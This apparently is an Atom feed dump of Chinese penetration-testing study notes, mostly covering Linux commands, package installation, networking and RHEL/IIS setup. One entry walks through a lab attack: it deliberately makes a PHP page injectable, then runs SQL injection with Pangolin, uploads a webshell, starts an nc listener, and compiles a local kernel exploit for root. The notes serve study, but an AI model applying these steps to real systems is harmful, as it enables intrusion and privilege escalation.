文件名.bz2 它相对于gzip压缩率更高# ls -lh# gzip install.log install.log.gz(或者高压缩)# gzip -9 install.log install.log.gz# ls -lh# gzip -d install.log.gz# ls -lh# bzip2 install.log install.log.bz2# ls -lhtar(归档命令)(释放归档文件)(没有压缩功能)格式 tar 选项 归档文件名 源文件或目录-c 创建归档文件 扩展名为.tar-v 输出详细信息 -f 表示使用归档文件 如 -cvf 创建归档文件tar -cvf 4.tar 1 2 3 将文件1 2 3 打包归档为4.tartar -xvf 4.tar    --解包归档文件4.tar    --xvf 解包归档文件-x 解开归档文件 -t 列表查看包内的文件tar -tvf 4.tar -r --追加TAR文件至归档结尾tar -rvf 4.tar 5  --把5加入4.tar-p    --解包时保留原始文件及目录的权限-C    --解包时指定释放的目录文件夹-z    --调用gzip程序,进行解压或压缩 -j 调用bzip2 程序进行压缩或解压tar -cvzf test.tar.gz --被压缩的文件1 被压缩的文件2 创建归档压缩文件 后缀为gztar -cvjf test.tar.bz2 被压缩的文件1 被压缩的文件2 创建归档压缩文件 后缀为bz2tar -xvzf test.tar.gz -C /usr/src 解压释放归档到 /usr/src里面tar -xvjf test.tar.bz2 -C /usr/src 解压释放到归档到 /usr/src里面# tar -cvf 3.tar 1 2 ss-cvf创建一个归档  归档名为3.tar 将 1 2 ss归档到一起(先归档再压缩)# gzip 3.tar 3.tar.gz# ll# rm -rf 1 2 ss# tar zxvf 3.tar.gz    (归档的文件一般用tar解压)# ll# tar jxvf 4.tar.bz2    (用jxvf解压bz2,用zxvf解压gz)安装,升级,卸载RPM软件包 2-1安装或升级RPM软件    格式:rpm [选项] RPM包文件    用法:不同选项适用于不同情况        -i:安装一个新的rpm软件包        -U:升级某个rpm软件,若原本未装,则进行安装        -F:更新某个rpm软件,若原本未装,则放弃安装卸载指定的RPM软件    格式:rpm -e 软件名辅助选项    --force:强制安装所指定的rpm软件包    --nodeps:安装,升级或卸载软件时,忽略依赖关系    -h:以&quot;#&quot;号显示安装的进度    -v:显示安装过程中的详细信息RPM软件包封装的,需要安装RPM# cd /media# cd VMware\ Tools/# ls# tar zxvf VMwareTools-9-9.2-2496486.tar.gz -C /root/# cd# ls# cd vmare-tools-distrib/(./    --代指运行)(# ll  文件末尾要有-x,才是有权限  有权限才能添加)# ./ vmware-install.pl# chmod 644 vmware-install.pl失去权限# ./vmware-install.pl# chmod 755 vmware-install.pl添加权限-rwxr-xr-x.rwx    用户权限r-x    分组权限每一个权限加起来是7rwx421rwxrwxrwx777rwxr-x--x751# chmod u-w vmware-install.pl    u:所有者,g:组,o:其他人 -w 失去w功能安装要装载CD# umount /dev/sr0    --先卸载一下# mount /dev/sr0 /media# ls /media# ls /media/Packages/# ls /media/Packages/ &gt;12# wc -l 12安装man软件(# rpm -ivh /media/Packages/man-1.6....rpm)# cd /media# cd Packages/# rpm -ivh man-1.6f...rpm# man ls# rpm -e man    --卸载man# clear查看已安装软件# rpm -qa# rpm -qa man    --查看有没有安装man# rpm -qi man    --查看详细信息# rpm -ql man    --查看安装目录第二种方法:编译安装过程    下载源代码安装包文件    源代码:1.tar.gz 2.自带安装程序 3.编译配置才能安装的    步骤1:tar解包    步骤2:./configure配置    用途:设置安装目录,安装模块等选项    步骤3:make编译    用途:生成可执行的二进制文件    步骤4:make install安装    用途:复制二进制文件到系统,配置应用环境    --测试及应用,维护软件首选安装方法:依赖关系的软件安装:# yum -y install firefox    --安装一些软件    # vi /etc/yum.repos.d/rhel-source.repo    --通过vi编辑它区分:firefox的就可以直接安装,make的需要配置,修改的地方:[rhel-source-beta]底行模式:.,$d.:光标所在行,:到$:最后d:删除[rhel-source]enabled=0-&gt;enabled=1按r再按1    --替换baseurl=f-&gt;按D,之后的全部删除按abaseurl=file:///media/Server    --路径复制gpgkey里面的-&gt;/etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-releasewq导入秘钥# rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release# yum -y install firefox必须指定位置,yum才能安装成功apt-get        --kali安装方法,需要保证联网apt-get install xxx.dpkgdpkg -i xxdpkg -ldpkg -r xx添加用户账号:    useradd命令:    格式:useradd [选项]... 用户名    常用命令选项:    -u:指定UID标记号    -d:指定宿主目录,缺省为 /home/用户名    -e:指定账号失效时间    -g:指定用户的基本组名(或UID号)    -G:指定用户的附加组名(或GID号)    -M:不为用户建立并初始化宿主目录    -s:指定用户的登录shell&lt;!--# yum -y remove man    --卸载--&gt;# useradd cracer# ls /home# su - cracer    --切换用户# passwd cracer --更改密码123123用户添加示例:指定mike的基本组为mike,并加入到ftpuser组;指定主目录为/ftphome/mike;不允许mike通过本地登录服务器[root@localhost~]# useradd -d /ftphome/mike -g mike -G ftpuser -s /sbin/nologin mike--对应的基本组,附加组必须存在删除用户账号--userdeluserdel命令:格式:userdel [-r] 用户名添加 -r 选项时,表示连用户的宿主目录一并删除[root@localhost~]# useradd stu01[root@localhost~]# ls -ld /home/stu01/drwx-----2 stu01 stu01 4096 09-09 12:38 /home/stu01/[root@localhost~]# userdel -r stu01    --加-r会把家目录也删除[root@localhost~]# ls -ld /home/stu01/ls:/home/stu01/:没有那个文件或目录Linux系统网路配置:查看网络接口信息--ifconfig查看所有活动网络接口的信息执行ifconfig命令查看指定网络接口信息格式:ifconfig 网络接口名    [root@localhost~]# ifconfig eth0    --eth0:代指网卡名,自己写    eth0 Link encap:Ethernet HWaddr 00:0C:29:57:8B:DO    inet addr:192.168.4.11 Boast:192.168.4.255 Mask:255.255.255.0    ......网卡类型:名称    类型eth0    以太网lo    (虚拟)回环设备ppp0    使用PPP协议打的串口设备(通常指调制解调器)tr0    令牌环(Token Ring)fddi0    光纤查看主机名称--hostname    hostname命令    查看或设置当前主机名;    格式:hostname查看路由表条目---route    route命令    查看或设置主机中路由表信息    格式:route [-n]    # route -n查看网络连接情况--netstat    netstat命令    查看系统的网络连接状态,路由表,接口统计等信息    格式:netstat [选项]    常用选项:    -a:显示所有活动连接    -n:以数字形式显示    -p:显示进程信息    -t:查看TCP协议相关信息    -u:查看UDP协议相关信息    -r:显示路由表信息# netstat -anpt | grep:21设置路由记录---route删除路由表中的默认网关记录格式:route del default gw IP地址向路由表中添加默认网关记录格式:route add default gw IP地址添加到指定网段的路由记录格式:route add -net 网段地址/24 gw IP地址删除到指定网段的路由记录格式:route del -net 网段地址网络接口配置文件/etc/sysconfig/network-scripts/目录下的ifcfg-eth0:第1块以太网卡的配置文件ifcfg-eth1:第2块以太网卡的配置文件...# ls /etc/sysconfig/network-scripts/ifcfg-*# ls /etc/sysconfig/network-scripts/ifcfg-eth0DEVICE=eth0ONBOOT=yes    --BOOTPROTO=staticIPADDR=192.168.4.1    --IP    NETMASK=255.255.255.0    --子网掩码GATEWAY=192.168.4.2    --网关静态改IP(改东西必须用vi命令)# vi /etc/sysconfig/network-scripts/ifcfg-eth0启用,禁用网络接口配置    重启network网络服务    # service network restart    正在关闭接口 eth0:    [确定]    关闭环回接口:        [确定]    弹出环回接口:        [确定]    弹出界面eth0:        [确定]    禁用,启用网络接口    # ifdown eth0    # ifup eth0域名解析配置文件/etc/resolv.conf文件用途:保存本机需要使用的DNS服务器的IP地址# vi /etc/resolv.confsearch localdomainnameserver 202.106.0.20        --DNS的IP地址实战:linux安装apache,搭建网站,....(需要安装5个软件包)(可以直接安装多个软件包)# yum -y install httpd php mysql mysql-server php-mysql(httpd:代表apache)(mysql-server:mysql服务器)(php-mysql:两者连接的软件)-&gt;给网站权限# ls /var/www/html/启动服务# service httpd start# service mysqld start设置mysql密码# mysqladmin -uroot password 123456登录mysql# mysql -uroot -p123456mysql&gt; show databasesmysql&gt; use mysql;mysql&gt; select * from admin;mysql&gt; show tables;mysql&gt; select * from user;退出mysql&gt; quit;访问192.168.80.140访问不到将防火墙配置到最低,将防火墙策略清空# iptables -F复制测试平台-&gt;var-&gt;www-&gt;html-&gt;复制过去[root@cracer var]# chown -R root www改权限,递归改apache是程序用户,安装完成之后自动添加[root@cracer var]# chown -R apache www复制测试平台-&gt;var-&gt;www-&gt;html-&gt;复制过去login-&gt;admin+回车修改数据库-&gt;jian root 123456查找网站漏洞-&gt;http://192.168.80.138/article.php?id=5http://192.168.80.138/article.php?id=5 and 1=1(此测试网站已被审计改过)手动修改成有漏洞的网站-&gt;[www]# cd html/[html]# vi article.php删除if(id==&apos;&apos;){};这一条在下一个if里面找WHERE id=&apos;&quot;.#_REQUEST[&apos;id&apos;].&quot;&apos;,#db  --将&quot; &quot;删除http://192.168.80.138/article.php?id=5 and 1=1如果网站没有变化,则说明有漏洞-&gt;把1改成2 测试注入-&gt;复制http://192.168.80.138/article.php?id=5 and 1=1到Pangolin-&gt;将木马cc(2).php放入到网站,改名为cc.phphttp://192.168.80.138/cc.php提权-&gt;先将防火墙关闭win_cmd-&gt;nc.exe -l -n -v -p 12666    --12666是端口在网站木马执行命令:uname -r    --查看内核版本exp-&gt;linux-&gt;3.2-&gt;2.6.32.c复制或者直接在网站木马上传    上面输入/tmp/,选择文件,上传win-&gt;cd tmpgcc 2.6.32.c找a.out  (xxx.out文件)-&gt;执行a.outa.out</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;vi是一个较大的unix命令,在启动的时候也有它自己的选项和参数
+基本语法:
+    vi [-options] [+[n]] [file]
+常用选项有:-r , -R
+    -r用于恢复系统突然崩溃时正在编辑的文件
+    -R用于以只读方式打开文件
+    +n用来指明进入vi后直接位于文件的第n行,如果不指定n,则位于最后一行
+
+# cp /etc/resolv.conf ss
+# cat ss
+# vi +3 ss    --光标停在第3行
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(5)-linux常用命令及目录结构</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-5-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-5-linux常用命令及目录结构/</id>
+    <published>2018-09-09T19:57:21.000Z</published>
+    <updated>2018-09-09T11:59:32.114Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>Linux系统目录结构:文件系统(类似我的电脑)-&gt;有很多目录    bin(存放普通用户可以运行的命令)    sbin(存放只有管理员用户才能执行的命令)    boot(存放linux操作系统引导的配置文件)    dev(存放存储文件,包括硬盘)    etc(存放系统和应用的配置文件)    home(存放普通用户的家目录)    lib(存放函数库文件)    lost+found(一个分区挂在这)</code></pre><a id="more"></a>        <pre><code>    media/mnt(存放挂载光盘,一些外来介质)    opt(安装外围的大型程序)    proc(随着开机生成的进程信息)    root(超级用户的目录)    selinux(对程序进行控制的)    srv()    sys(存放系统配置文件的)    tmp(临时文件)    usr(安装一些外部程序usr/local,usr/src)    var(日志,安装apache根目录等)树形目录结构    最顶层:根目录命令行提示符&quot;#&quot;代表root登录的时候就是#    RHEL6中默认安装的桌面环境是:(Jnomo?)桌面(一般不耗费较多资源),KDE桌面从字符界面切换到图形界面:    Ctrl+Alt+F2-&gt;进入字符界面 ,需要登录可以开:F2-F7都是字符界面    Ctrl+Alt+F1-&gt;进入图形化界面(新手上手红帽,再kali)Linux常用命令:Linux命令:    用于实现某一类功能的指令或程序    命令的执行依赖于解释器程序(reg:/bin/bash)Linux命令的分类:    (内部自带的命令)    内部命令:属于Shell解释器的一部分    (安装程序之后的命令)    外部命令:独立于Shell解释器之外的程序文件.linux命令行格式2-1通用命令格式:命令字 [选项] [参数]选项及参数含义    选项:用于调节命令的具体功能    以&quot;-&quot;引导短格式选项(单个字符),例如&quot;-l&quot;    以&quot;--&quot;引导长格式选项(多个字符),例如&quot;--color&quot;    多个短格式选项可以写在一起,只用一个&quot;-&quot;引导,例如&quot;-al&quot;参数:命令操作的对象,如文件,目录名等.[root@localhost~]#ls -l /home总计8drwx------2 benet benet 4096 09-08 08:50 benetlinux命令行格式2-2命令行编辑的几个辅助操作    Tab键:自动补齐    反斜杠&quot;\&quot;:强制换行    Ctrl+U:清空至行首    Ctrl+K:清空至行尾    Ctrl+L:清屏    Ctrl+C:取消本次命令编辑-&gt;SecureCRT-&gt;创建会话new Session Wizard-&gt;SSH2(相当于win下的charnet)-&gt;ip,port,password-&gt;Accept&amp;Save-&gt;进入编辑获得命令帮助内部命令help    查看Bash内部命令的帮助信息命令的&quot;--help&quot;选项    适用于大多数外部命令使用man命令阅读手册页    使用&quot;↑&quot;,&quot;↓&quot;方向键滚动文本    使用Page Up和Page Down键翻页    按Q或q键退出阅读环境,按&quot;/&quot;键后查找内容查看系统内核信息--uname    uname命令:        查看系统相关信息        常用命令选项:            -a:显示主机名,内核版本,硬件平台等详细信息            -r:显示内核版本reg:    [root@localhost~]# uname -r    2.6.18-194.el5    # which uname        --查看路径查看系统主机名--hostname    hostname命令:        查看主机的完整名称        包括主机名称,所在域的名称reg:    [root@localhost~]# hostname    localhost.localdomain查看IP--ifconfig    # ifconfig        --查看全部ip    # ifconfig eth0        --查看自己的ip查看系统CPU信息/内存信息    查看CPU信息    /proc/cpuinfo    [root@localhost~]# cat /proc/cpuinfo    processor    :0    vendor_id    :GenuineIntel    cpu family    :6    model        :23    model name    :Intel(R) Celeron(R) CPU E3200 @ 2.40GHz    stepping    :1.0    cpu MHz        :2394.029    cache size    :1024KB    ...    查看内存信息    /proc/meminfo    [root@localhost~]# cat /proc/meminfo关机及重启操作    关机操作    shutdown,poweroff    [root@localhost~]# shutdown -h now    [root@localhost~]# poweroff    [root@localhost~]# halt    重启操作    shutdown,reboot    [root@localhost~]# shutdown -r now    [root@localhost~]# reboot查看及切换目录    pwd命令        用途:查看工作目录(Print Working Directory)    cd命令        用途:切换工作目录(Change Directory)        格式:cd [目录位置]        [root@localhost~]# cd /etc/httpd        --绝对路径        [root@localhost httpd]# cd/conf        --相对路径        [root@localhost conf]# cd~benet        --相对路径        [root@localhost benet]# pwd        /home/benet        [root@localhost zhangsan]# ls -dl../jerry    --相对路径        drwx-----2 jerry jerry 4096 09-14 2150 ../jerry目录操作命令-ls    ls命令        用途:列表(List)显示目录内容        格式:ls [选项]... [目录或文件名]        -l:以长格式显示        -a:显示所有子目录和文件的信息,包括隐藏文件        -A:类似于&quot;-a&quot;,但不显示&quot;.&quot;和&quot;..&quot;目录的信息        -h:以更易读的字节单位(K,M等)显示信息        -R:递归显示内容        --color:以颜色区分不同类型文件ls -l:/*-rwxr-xr-x.*/权限(读,写,可执行) 1 /*root*/创建人 /*root*/所在分组      /*73*/大小B  /*9月 17 2015*/创建日期 /*ifcfg-eth0*/文件名-rwx:代表所有者权限    r-x(中间):代表组对其的权限  r-x(后面):代表其他人权限第一个如果是&quot;l&quot;,就代表是链接,x:可执行目录操作命令--du    du命令:        用途:统计目录及文件的空间占用情况(estimate space usage)        格式:du [选项]... [目录或文件名]    常用命令选项:        -a:统计时包括所有的文件,而不仅仅只统计目录        -h:以更易读的字节单位(K,M等)显示信息        -s:只统计每个参数所占用空间总的大小    [root@localhost~]# du -sh /home    72K /home创建目录命令--mkdir    mkdir命令:        用途:创建新的目录(Make Directory)        格式:mkdir [-p] [/路径/]目录名        [root@localhost~]# mkdir -p /multimedia/movie/cartoon        [root@localhost~]# ls -R /multimedia        /multimedia:        movie        /multimedia/movie:        cartoon        /multimedia/movie/cartoon:创建文件命令--touch    touch命令:        用途:新建空文件,或更新文件时间标记        格式:touch 文件名...    [root@localhost~]# cd /multimedia/movie/cartoon    [root@localhost cartoon~]# touch HuaMulan.rmvb NeZhaNaoHai.mp4    [root@localhost cartoon]# ls -lh    总计 0    -rw-r--r-- 1 root root 0 02-11 21:44 HuaMulan.rmvb    -rw-r--r-- 1 root root 0 02-11 21:44 NeZhaNaoHai.mp4创建连接文件--ln    ln命令:        用途:为文件或目录建立链接(Link)        格式:ln [-s] 源文件或目录... 链接文件或目标目录    常用命令选项:        -s:建立符号链接文件(省略此项则建立硬链接)(快捷方式)    [root@localhost~]# ln -s /etc/httpd/conf/httpd.conf /etc/    [root@localhost~]# ls -lh /etc/httpd.conf    lrwxrwxrwx 1 root root 26 05-02 01:54 /etc/httpd.conf -&gt; /etc/httpd/conf/httpd.conf    [root@localhost~]# ln /usr/sbin/system-config-network /sbin/netconfig    [root@localhost~]# ls -lh /sbin/mynetconfig    -rwxr-xr-x 2 root root 188 2007-01-08 /sbin/mynetconfig---cat:查看文件复制文件或目录--cp    cp命令:        用途:复制文件或目录        格式:cp [选项]... 源文件或目录... 目标文件或目录    常用命令选项:    -r:递归复制整个目录树    -p:保持源文件的属性不变    -f:强制覆盖目录同名文件或目录    -i:需要覆盖文件或目录时进行提醒    [root@localhost~]# cp -r /boot/grub/ /etc/host.conf public_html/删除文件或目录---rm    rm命令        用途:删除文件或目录        格式:rm [选项]... 文件或目录    常用命令选项:    -f:强行删除文件或目录,不进行提醒    -i:删除文件或目录时提醒用户确认    -r:递归删除    [root@localhost~]# rm -rf public_html/grub/移动文件或目录----mv    mv命令:        用途:移动文件或目录        --若如果目标位置与源位置相同,则相当于改名        格式:mv [选项]... 源文件或目录... 目标文件或目录    [root@localhost~]# mv mytouch mkfile    [root@localhost~]# ls -lh mytouch mkfile    ls:mytouch:没有那个文件或目录    -rwxr-xr-x 1 root root ... mkfile    reg:    mv cracer /seven/    移动到seven下    如果在同一目录下    mv cracer seven 就是改名为seven查找文件或目录---find    find命令        用途:用于查找文件或目录        格式:find [查找范围] [查找条件]    常用查找条件:    -name:按文件名查找    -size:按文件大小查找    -user:按文件属主查找    -type:按文件类型查找    [root@localhost~]# find /etc -name &quot;resol*.conf&quot;    /etc/resolv.conf    /etc/sysconfig/networking/profiles/default/resolv.conf    reg:    find / -name cracer进入vi:vi是一个较大的unix命令,在启动的时候也有它自己的选项和参数基本语法:    vi [-options] [+[n]] [file]常用选项有:-r , -R    -r用于恢复系统突然崩溃时正在编辑的文件    -R用于以只读方式打开文件    +n用来指明进入vi后直接位于文件的第n行,如果不指定n,则位于最后一行</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;Linux系统目录结构:
+
+文件系统(类似我的电脑)-&amp;gt;有很多目录
+    bin(存放普通用户可以运行的命令)
+    sbin(存放只有管理员用户才能执行的命令)
+    boot(存放linux操作系统引导的配置文件)
+    dev(存放存储文件,包括硬盘)
+    etc(存放系统和应用的配置文件)
+    home(存放普通用户的家目录)
+    lib(存放函数库文件)
+    lost+found(一个分区挂在这)
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(4)-IIS安装与linux安装</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-4-IIS%E5%AE%89%E8%A3%85%E4%B8%8Elinux%E5%AE%89%E8%A3%85/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-4-IIS安装与linux安装/</id>
+    <published>2018-09-09T19:55:56.000Z</published>
+    <updated>2018-09-09T11:56:54.278Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>IIS安装多个网站1.多IP2.同IP多端口3.域名cmd-&gt;ncpa.cpl</code></pre><a id="more"></a>    <pre><code>绑定域名就不能用IP访问,只能用域名访问,如果你没有定义DNS解析域名的话,就访问不到.IIS-&gt;添加-&gt;自定义-&gt;DNS服务器.开始-&gt;管理-&gt;DNS-&gt;baidu.com选中-&gt;右侧右键-&gt;新建主机-&gt;www,IP本地连接-&gt;IPv4-&gt;下方DNS输入IIS-&gt;主目录-&gt;纯脚本......(看其他笔记)TODO------------27min之前没看完linux:linux没有盘符,全是文件夹的形式.1.linux系统的介绍,安装,密码的破解2.linux系统目录结构,常用命令3.linux系统网络配置linux系统的介绍:操作系统:有ibm-&gt;unix(比较昂贵)Unix是由美国电话电报公司(AT&amp;T)贝尔实验室两个工程师所创造的操作系统,它允许计算机同时处理多用户和程序.价钱昂贵,性能和稳定性比较好.目前大型政府单位,大型企业,航空公司,金融机构都在使用.Unix和硬件配套卖的.linux:可以运行在PC机上类似于Unix风格的操作系统,由众多程序员通过Internet协作开发.(Open Source)自由软件(Free Software)定义是自由的软件而不是免费的软件.使用自由,研究自由,散布自由,改良自由Linus Torvalds,芬兰人,芬兰吉祥物:企鹅linux系统结构:由内核及应用程序组成.不同的厂商根据各自的需要将各种应用软件和Linux内核一起打包即成为一个Linux发行版本发行版本(distribution)Linux常见的发行版本:RedHat Linux(常见)SuSE Linux(安全性高,比较卡)Ubuntu LinuxMandrake LinuxCaldera LinuxTurbolinux LinuxDebian GNU/Linux(适用个人用户)Gentoo LinuxLinpus Linux优点:1.免费,收费是维护的时候2.....更佳的性能2-1CentOS 5.3 vs Windows Server 2003Apache Tomcat Jboss 静态页面访问性能比较硬件平台:CPU Xeon2.0x4,内存4GB更佳的性能2-2磁盘IO性能测试将小文件从硬盘拷到硬盘(603MB)(12文件夹2154个文件)安全性更好:病毒,木马相对少高性能计算机:基本都在用Linux新浪GoogleQQNEC,摩托罗拉,诺基亚,三星都有Linux手机亚马逊SONY的PS2游戏机中国国家邮政局德国慕尼黑美国天气预报如何学习linux:1.从命令开始打基础2.选一本好书3.养成在命令行下工作的习惯4.学习shell命令解释器5.实践6.学会使用文档7.在Linux论坛获取帮助8.学习专业英文4.ISCE安装:内核版本2-1提权,版本号,找相应的漏洞XX.YY.ZZYY:主版本号ZZ:次版本号reg:2.5.7奇数表示开发板本2.6.18偶数表示稳定版本稳定版本2.4.6-&gt;2.4.7-&gt;修复BUG-&gt;2.4.8-&gt;2.4.....开发版本2.5.7-&gt;2.5..-&gt;增加新功能-&gt;2.5.77    -&gt;拷贝-&gt;稳定版本2.6.1-&gt;2.6....磁盘分区表示:Linux中将硬盘,分区等设备均表示为文件./dev/hda5dev:硬件设备文件所在的目录hd:表示IDE设备(hd的硬盘);    sd:表示SCSI设备;a:硬盘的顺序号,以字母a,b,c...表示    代表第几块硬盘5:分区的顺序号,以数字1,2,3...表示    代表第几个分区这里,前4个是主分区,5代表第1个逻辑分区第1个主分区:/dev/hda1第2个主分区:/dev/hda2第1块SCSI硬盘设备/dev/sda第1个逻辑分区/dev/hda5第2个逻辑分区/dev/hda6扩展分区文件系统类型:Linux中默认使用的文件系统类型:EXT4,第3代扩展(Extended)文件系统SWAP,交换文件系统(相当于win的虚拟内存,reg:如果是2G,则分win的2048-4096内存(1-2倍))Linux支持的其它文件系统类型FAT16,FAT32,NTFS(Win用的多)XFS,JFS...RHEL6-&gt;红帽6: 默认是EXT4安装RHEL6系统:安装步骤:1.引导    设置主机引导设备为光盘驱动器    从光盘启动主机2.检测安装光盘的完整性3.配置安装程序    选择安装过程显示语言,键盘类型,初始化磁盘,分区    设置网络地址,系统时区,管理员口令    定制要安装的软件包4.复制文件并完成安装过程初始化RHEL系统:用户许可协议网络防火墙配置SELinux配置Kdump配置系统日期和时间的设置设置软件更新添加系统用户声卡测试安装附加光盘VM-&gt;RHEL6 32-&gt;20GCD-&gt;rhel-server-6.2-i386-dvd.iso1.安装/升级系统 2.安装系统使用基本驱动 3.救援系统(选1就行)-&gt;skip-&gt;next-&gt;Chinese-&gt;美国式英语-&gt;是,丢弃所有设备-&gt;Create Custom Layout(自定义创建分区)-&gt;sda-&gt;空闲-&gt;创建-&gt;标准分区-&gt;创建-&gt;挂载点:/boot(挂载引导配置信息的地方)-&gt;文件大小200M-&gt;确定-&gt;空闲-&gt;创建-&gt;文件系统类型-&gt;swap-&gt;大小2048MB-&gt;空闲-&gt;创建-&gt;挂载点:/-&gt;勾选使用全部可用空间-&gt;确定-&gt;下一步-&gt;格式化-&gt;write*如果是U盘安装的时候,必须把/dev/sda改成/dev/sdb-&gt;下一步-&gt;最小-&gt;勾选现在定制-&gt;下一步-&gt;桌面-&gt;X窗口系统,图形管理工具,字体,桌面,输入法开发-&gt;勾选开发工具;语言支持-&gt;中文支持-&gt;下一步</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;IIS安装多个网站
+
+1.多IP
+2.同IP多端口
+3.域名
+
+cmd-&amp;gt;ncpa.cpl
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(3)-hydra与netstat</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-3-hydra%E4%B8%8Enetstat/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-3-hydra与netstat/</id>
+    <published>2018-09-09T19:54:13.000Z</published>
+    <updated>2018-09-09T11:55:18.693Z</updated>
+    
